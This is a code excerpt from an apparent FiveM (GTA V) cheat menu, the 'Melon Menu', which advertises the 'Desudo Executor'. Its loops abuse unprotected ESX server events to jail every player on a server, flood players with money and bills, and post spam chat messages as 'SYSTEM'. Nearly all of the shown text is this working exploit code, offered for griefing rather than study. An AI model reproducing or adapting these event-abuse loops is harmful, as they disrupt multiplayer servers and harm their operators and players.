	...
	function()
		while Enabled do
			...
			if banallusers then
				...
				TriggerServerEvent("esx_jailler:sendToJail", GetPlayerServerId(i), 59999, "DM ME Melon#1379 for Desudo Executor!!", 997)
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "DM ME Melon#1379 for Desudo Executor!!", 300)
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "DM ME Melon#1379 for Desudo Executor!!")
				TriggerServerEvent("esx-qalle-jail:jailPlayerNew", GetPlayerServerId(i), 5000, "DM ME Melon#1379 for Desudo Executor!!")
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 50000)
				TriggerServerEvent("8321hiue89js", GetPlayerServerId(i), 5007, "DM ME Melon#1379 for Desudo Executor!!", 32532532, securityToken)
				TriggerServerEvent("esx_jailer:sendToJailariesfrajerze", GetPlayerServerId(i), 300000, "DM ME Melon#1379 for Desudo Executor!!", 500324532)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 5000, "DM ME Melon#1379 for Desudo Executor!!")
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 5000, "dude weed")
				TriggerServerEvent('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .." DM ME Melon#1379 for Desudo Executor!!")
					end
				end
			...
			if esxdestroy then
				for i = 0, 450 do
						...
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Best Melon Menu", 10000000)
						TriggerServerEvent('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .." DM ME Melon#1379 for Desudo Executor!!.")
				end
			end
...
Citizen.CreateThread(
	function()
		...
		ariesMenu.CreateMenu("MainMenu", "Melon ~n~~r~MENU")
		ariesMenu.SetSubTitle("MainMenu", "Melon#1379")
		...
		while Enabled do
			if ariesMenu.IsMenuOpened("MainMenu") then
			    drawNotification("~g~Working... ~n~~r~Melon Menu ~s~V 3.0")
				drawNotification("~g~Official Discord: ~s~~n~ ~n~~r~Melon#1379")
